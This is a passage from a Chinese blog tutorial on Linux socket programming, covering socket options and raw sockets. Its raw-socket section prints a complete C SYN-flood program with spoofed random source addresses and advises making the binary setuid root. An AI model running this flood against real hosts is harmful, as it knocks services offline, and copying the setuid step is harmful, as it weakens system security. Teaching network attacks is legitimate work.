+<p>在多进程程序里面, 如果有几个子进程共享一个套接字时, 如果我们使用 shutdown, 那么所有的子进程都不能够操作了.<br>这个时候我们只能够使用 close 来关闭子进程的套接字描述符.</p>
+<h2 id="套接字选项"><a href="#套接字选项" class="headerlink" title="套接字选项"></a>套接字选项</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>控制套接字的行为, 如缓冲区大小, 端口重用等</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;          /* See NOTES */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getsockopt</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> level, <span class="keyword">int</span> optname,</span></span></span><br><span class="line"><span class="function"><span class="params">		 <span class="keyword">void</span> *optval, <span class="keyword">socklen_t</span> *optlen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setsockopt</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> level, <span class="keyword">int</span> optname,</span></span></span><br><span class="line"><span class="function"><span class="params">	       <span class="keyword">const</span> <span class="keyword">void</span> *optval, <span class="keyword">socklen_t</span> optlen)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>参数说明: (当做key-value, map去理解)</p>
+<p>相当于每个type里面有多个多个key, 每个key有多种value.</p>
+<p><code>level</code> : (type)</p>
+<ul>
+<li>SOL_SOCKET:  通用套接字 选项</li>
+<li>IPPROTO_IP:  IP 选项</li>
+<li>IPPROTO_TCP: TCP 选项</li>
+</ul>
+<p><code>optname</code> : (key)<br>指定控制的方式(选项的名称), 下面详细解释</p>
+<p><code>optval</code> :  (value)<br>获得或者是设置套接字选项.根据选项名称的数据类型进行转换</p>
+<p>详细说明如下:</p>
+<p>SOL_SOCKET:(optname-ptval)</p>
+<ul>
+<li>SO_BROADCAST 允许发送广播数据 int</li>
+<li>SO_DEBUG 允许调试 int</li>
+<li>SO_DONTROUTE 不查找路由 int</li>
+<li>SO_ERROR 获得套接字错误 int</li>
+<li>SO_KEEPALIVE 保持连接 int</li>
+<li>SO_LINGER 延迟关闭连接 struct linger</li>
+<li>SO_OOBINLINE 带外数据放入正常数据流 int</li>
+<li>SO_RCVBUF 接收缓冲区大小 int</li>
+<li>SO_SNDBUF 发送缓冲区大小 int</li>
+<li>SO_RCVLOWAT 接收缓冲区下限 int</li>
+<li>SO_SNDLOWAT 发送缓冲区下限 int</li>
+<li>SO_RCVTIMEO 接收超时 struct timeval</li>
+<li>SO_SNDTIMEO 发送超时 struct timeval</li>
+<li>SO_REUSERADDR 允许重用本地地址和端口 int</li>
+<li>SO_TYPE 获得套接字类型 int</li>
+<li>SO_BSDCOMPAT 与 BSD 系统兼容 int</li>
+</ul>
+<p>IPPROTO_IP</p>
+<ul>
+<li>IP_HDRINCL 在数据包中包含 IP 首部 int</li>
+<li>IP_OPTINOS IP 首部选项 int</li>
+<li>IP_TOS 服务类型</li>
+<li>IP_TTL 生存时间 int</li>
+</ul>
+<p>IPPRO_TCP</p>
+<ul>
+<li>TCP_MAXSEG TCP 最大数据段的大小 int</li>
+<li>TCP_NODELAY 不使用 Nagle 算法 int</li>
+</ul>
+<p>使用较多的案例:</p>
+<h3 id="案例-端口复用"><a href="#案例-端口复用" class="headerlink" title="案例(端口复用)"></a>案例(端口复用)</h3><p>在 server 的 TCP 连接没有完全断开之前不允许重新监听是不合理的.<br>因为, TCP 连接没有完全断开指的是 connfd (clinetIP:6666)没有完全断开, 而我们重新监听的是 lis-tenfd(0.0.0.0:6666),<br>虽然是占用同一个端口, 但 IP 地址不同, connfd 对应的是与某个客户端通讯的一个具体的 IP 地址, 而 listenfd 对应的是 wildcard address.</p>
+<p>解决这个问题的方法是使用 setsockopt()设置 socket 描述符的选项 SO_REUSEADDR 为 1，表示允许创建端口号相同但 IP 地址不同的多个 socket 描述符.<br>在 server 代码的 socket()和 bind()调用之间插入如下代码:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> opt = <span class="number">1</span>;</span><br><span class="line">setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, <span class="keyword">sizeof</span>(opt));</span><br></pre></td></tr></table></figure>
+<h3 id="案例-getsockopt"><a href="#案例-getsockopt" class="headerlink" title="案例(getsockopt)"></a>案例(getsockopt)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> s, optval, optlen = <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>((s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>))&lt;<span class="number">0</span>) &#123;</span><br><span class="line">	perror(<span class="string">"socket.\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*int getsockopt(int s, int level, int optname, void*optval, socklen_t* optlen);*/</span></span><br><span class="line">      getsockopt(s, SOL_SOCKET, SO_TYPE, &amp;optval, (<span class="keyword">socklen_t</span> *)&amp;optlen);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"optval = %d\n"</span>, optval);</span><br><span class="line"></span><br><span class="line">      close(s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="原始套接字"><a href="#原始套接字" class="headerlink" title="原始套接字"></a>原始套接字</h2><p>以TCP协议为例, 把原来需要系统内核做的事情, 现在我们自己来做封包 (IP数据包 &amp;&amp; TCP数据包, 具体发送还是交给内核)<br>原来的话, 我们只是处理好要发送的Buffer.</p>
+<p>调用socket函数的时候, type传入的(SOCK_STREAM,SOCK_DRAGM) 或者 SOCK_RAW; 协议传入:IPPROTO_ICMP, IPPROTO_TCP, IPPROTO_UDP 等</p>
+<h3 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡"></a>肉鸡</h3><p>使用案例: (肉鸡攻击, 你一定听过)</p>
+<p>下面是一个demo, 自定义tcp的源地址(模拟实现dos):<br>dos.c  生成可执行文件 DOS, 恶意客户端代码如下:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DESTPORT 80 <span class="comment">/* 要攻击的端口(WEB) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOCALPORT 8888 <span class="comment">/*local port*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_tcp</span><span class="params">(<span class="keyword">int</span> sockfd,struct sockaddr_in *addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">check_sum</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> *addr,<span class="keyword">int</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sockfd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> on=<span class="number">1</span>;  <span class="comment">//used by setsockopt()</span></span><br><span class="line">  <span class="keyword">if</span>(argc!=<span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Usage:%s hostname\n\a"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*feed the addr*/</span></span><br><span class="line">  bzero(&amp;addr,<span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">  addr.sin_family=AF_INET;</span><br><span class="line">  addr.sin_port=htons(DESTPORT);</span><br><span class="line">  <span class="comment">/*deal with addr.sin_addr*/</span></span><br><span class="line">  <span class="keyword">if</span>(inet_aton(argv[<span class="number">1</span>], &amp;addr.sin_addr)==<span class="number">0</span>) &#123; <span class="comment">/*what if user input 'localhost'*/</span></span><br><span class="line">    host=gethostbyname(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>(host==<span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"HostName Error:%s\n\a"</span>,hstrerror(h_errno));</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    addr.sin_addr=*(struct in_addr *)(host-&gt;h_addr_list[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 使用 IPPROTO_TCP 创建一个 TCP 的原始套接字 */</span></span><br><span class="line">  sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);</span><br><span class="line">  <span class="keyword">if</span>(sockfd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Socket Error:%s\n\a"</span>,strerror(errno));</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置 IP 数据包格式, 告诉系统内核模块 IP 数据包由我们自己来填写*/</span></span><br><span class="line">  setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &amp;on, <span class="keyword">sizeof</span>(on));</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/*只用超级用户才可以使用原始套接字*/</span></span><br><span class="line">  setuid(getpid());</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*send bomb*/</span></span><br><span class="line">  send_tcp(sockfd, &amp;addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*发送炸弹的实现*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_tcp</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr_in *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/*用来放置我们的数据包 */</span></span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">100</span>]; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcp</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> head_len; <span class="comment">//头部长度</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*我们的数据包实际上没有任何内容,所以长度就是两个结构的长度 */</span></span><br><span class="line">  head_len=<span class="keyword">sizeof</span>(struct ip)+<span class="keyword">sizeof</span>(struct tcphdr);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/*填充ip数据包头部(注意本机字节序和网络字节序)*/</span></span><br><span class="line">  bzero(buffer,<span class="number">100</span>); </span><br><span class="line">  ip=(struct ip *)buffer;</span><br><span class="line">  ip-&gt;ip_v=IPVERSION; <span class="comment">/** 版本一般的是 4 **/</span></span><br><span class="line">  ip-&gt;ip_hl=<span class="keyword">sizeof</span>(struct ip)&gt;&gt;<span class="number">2</span>; <span class="comment">/** IP 数据包的头部长度 **/</span></span><br><span class="line">  ip-&gt;ip_tos=<span class="number">0</span>; <span class="comment">/** 服务类型 **/</span></span><br><span class="line">  ip-&gt;ip_len=htons(head_len); <span class="comment">/** IP 数据包的长度 **/</span></span><br><span class="line">  ip-&gt;ip_id=<span class="number">0</span>; <span class="comment">/** 让系统去填写吧 **/</span></span><br><span class="line">  ip-&gt;ip_off=<span class="number">0</span>; <span class="comment">/** 和上面一样,省点时间 **/</span></span><br><span class="line">  ip-&gt;ip_ttl=MAXTTL; <span class="comment">/** 最长的时间 255 **/</span></span><br><span class="line">  ip-&gt;ip_p=IPPROTO_TCP; <span class="comment">/** 我们要发的是 TCP 包 **/</span></span><br><span class="line">  ip-&gt;ip_sum=<span class="number">0</span>; <span class="comment">/** 校验和让系统去做 **/</span></span><br><span class="line">  ip-&gt;ip_dst=addr-&gt;sin_addr; <span class="comment">/** 我们攻击的对象 **/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*填写 TCP 数据包 */</span></span><br><span class="line">  tcp=(struct tcphdr *)(buffer +<span class="keyword">sizeof</span>(struct ip));</span><br><span class="line">  tcp-&gt;source=htons(LOCALPORT);</span><br><span class="line">  tcp-&gt;dest=addr-&gt;sin_port; <span class="comment">/** 目的端口 **/</span></span><br><span class="line">  tcp-&gt;seq=random();</span><br><span class="line">  tcp-&gt;ack_seq=<span class="number">0</span>;</span><br><span class="line">  tcp-&gt;doff=<span class="number">5</span>;</span><br><span class="line">  tcp-&gt;syn=<span class="number">1</span>; <span class="comment">/** 我要建立连接 **/</span></span><br><span class="line">  tcp-&gt;check=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 好了,一切都准备好了.服务器,你准备好了没有?? ^_^ **/</span></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">/* 你不知道我是从那里来的, 让服务器阻塞等待 */</span></span><br><span class="line">    ip-&gt;ip_src.s_addr=random(); <span class="comment">// 把客户端的源地址设置为随机</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 什么都让系统做了,也没有多大的意思,还是让我们自己来校验头部吧(可选) */</span></span><br><span class="line">    tcp-&gt;check=check_sum((<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tcp, <span class="keyword">sizeof</span>(struct tcphdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//发送过去</span></span><br><span class="line">    sendto(sockfd,buffer,head_len,<span class="number">0</span>,addr,<span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 下面是首部校验和的算法,偷了别人的 */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">check_sum</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> *addr,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">register</span> <span class="keyword">int</span> nleft=len;</span><br><span class="line">  <span class="keyword">register</span> <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="keyword">short</span> *w=addr;</span><br><span class="line">  <span class="keyword">short</span> answer=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(nleft&gt;<span class="number">1</span>) &#123;</span><br><span class="line">    sum+=*w++;</span><br><span class="line">    nleft-=<span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(nleft==<span class="number">1</span>)&#123;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(&amp;answer)=*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)w;</span><br><span class="line">    sum+=answer;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  sum=(sum&gt;&gt;<span class="number">16</span>)+(sum&amp;<span class="number">0xffff</span>);</span><br><span class="line">  sum+=(sum&gt;&gt;<span class="number">16</span>);</span><br><span class="line">  answer=~sum;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span>(answer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译一下, 拿 localhost 做一下实验,看看有什么结果(千万不要试别人的啊).<br>为了让普通用户可以运行这个程序, 我们应该将这个程序的所有者变为root, 且设置 setuid 位, 之后再运行.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown root DOS</span><br><span class="line">chmod +s DOS</span><br></pre></td></tr></table></figure>
+<h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>这里只是把 <code>基本socket模型</code> 大概的轮廓给描述了一下, 还有许多问题和相关函数没有涉及到.</p>
+<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><p>比如具体的IO函数总结, 读写函数的封装, 错误处理, 函数头文件等.</p>
+<p>具体可以参考一下我的github库:<br><a href="https://github.com/WizardMerlin/network_life" target="_blank" rel="noopener">https://github.com/WizardMerlin/network_life</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/posts/8967f437/">技术: Linux 基础套接字模型</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Merlin</a></p>
+        <p><span>发布时间:</span>2017-06-11, 13:03:36</p>
+        <p><span>最后更新:</span>2018-04-12, 14:55:17</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/posts/8967f437/" title="技术: Linux 基础套接字模型">http://www.merlinblog.site/posts/8967f437/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://www.merlinblog.site/posts/8967f437/　　作者: Merlin" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/posts/1334152b/">
+                    技术: Epoll 模型
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/posts/81fba862/">
+                    技术: Linux网络学习参考
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#引子"><span class="toc-number">1.</span> <span class="toc-text">引子</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#连接函数"><span class="toc-number">2.1.</span> <span class="toc-text">连接函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#socket"><span class="toc-number">2.1.1.</span> <span class="toc-text">socket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bind"><span class="toc-number">2.1.2.</span> <span class="toc-text">bind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#listen和connect"><span class="toc-number">2.1.3.</span> <span class="toc-text">listen和connect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#accept"><span class="toc-number">2.1.4.</span> <span class="toc-text">accept</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IO函数"><span class="toc-number">2.2.</span> <span class="toc-text">IO函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本IO函数"><span class="toc-number">2.2.1.</span> <span class="toc-text">基本IO函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#专于socket"><span class="toc-number">2.2.2.</span> <span class="toc-text">专于socket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关闭IO"><span class="toc-number">2.2.3.</span> <span class="toc-text">关闭IO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#套接字选项"><span class="toc-number">2.3.</span> <span class="toc-text">套接字选项</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#说明"><span class="toc-number">2.3.1.</span> <span class="toc-text">说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例-端口复用"><span class="toc-number">2.3.2.</span> <span class="toc-text">案例(端口复用)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例-getsockopt"><span class="toc-number">2.3.3.</span> <span class="toc-text">案例(getsockopt)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原始套接字"><span class="toc-number">2.4.</span> <span class="toc-text">原始套接字</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#肉鸡"><span class="toc-number">2.4.1.</span> <span class="toc-text">肉鸡</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#尾巴"><span class="toc-number">3.</span> <span class="toc-text">尾巴</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#其他问题"><span class="toc-number">3.1.</span> <span class="toc-text">其他问题</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/posts/1334152b/" title="上一篇: 技术: Epoll 模型">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/posts/81fba862/" title="下一篇: 技术: Linux网络学习参考">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/posts/7ef0bd11/">技巧: iOS 工作流</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/1e2300e0/">Golang: 并发聊天室综合案例</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/74edbb6d/">Golang: TCP 文件传输案例</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/a8342f6/">Golang: TCP 简单并发服务器</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/aa0a3cc6/">技巧: B站视频下载脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/8180668e/">技巧: 多用户共享 Parralles 虚拟机</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/55b0329b/">Golang: 值类型&引用类型坑(12)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/ac5ecee9/">Golang: 函数类型实现接口封装问题(11)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/eecafb73/">Golang: struct打印输出问题(10)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/8f54ef0c/">Golang: string和byte slie字节问题(9)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/8a7f81db/">Golang: time计算问题(8)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/d4333ec1/">Golang: chan定义问题(7)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/aec4de55/">Golang: defer 时机问题(6)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e9bf7e00/">Golang: make和new坑(5)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e0c9893e/">Golang: import和package坑(4)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/4ff88030/">Golang: runtime.Gosched 问题(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/690caed4/">Golang: HTML Template案例(xml新闻解析+并发改进)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/4620296/">Golang: JSON 小案例(读配置文件)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/777e9274/">Golang: JSON 综合案例(天气预报)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/21f718fc/">Golang: RESTful 小案例</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/ad1d8b3/">Golang: 泛型容器的安全问题 (2)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/3fde375b/">Golang: 内嵌真的不是继承 (1)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/ede42ab6/">Golang: 注意空接口运行时类型 (0)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/bd0987da/">Android: 音频框架&驱动解析</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/6c3c68b0/">Gcc: Gcc优化指南(5. 功成身退-总结)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/466242ae/">Gcc: Gcc优化指南(4. Gcc & G++ & 相关工具)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/425935e0/">Gcc: Gcc优化指南(3. Gcc Optimize-核心)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/5cd24f32/">Gcc: Gcc优化指南(2. Gcc Options)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/11ea881a/">Gcc: Gcc优化指南(1. Common Problmes of Path & Libs)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/1e58a5cc/">量化: 数学和量化研究(0. 总起)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e6805cb0/">Gcc: Gcc优化指南(0. Basic Skills)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/78268fe4/">Golang: 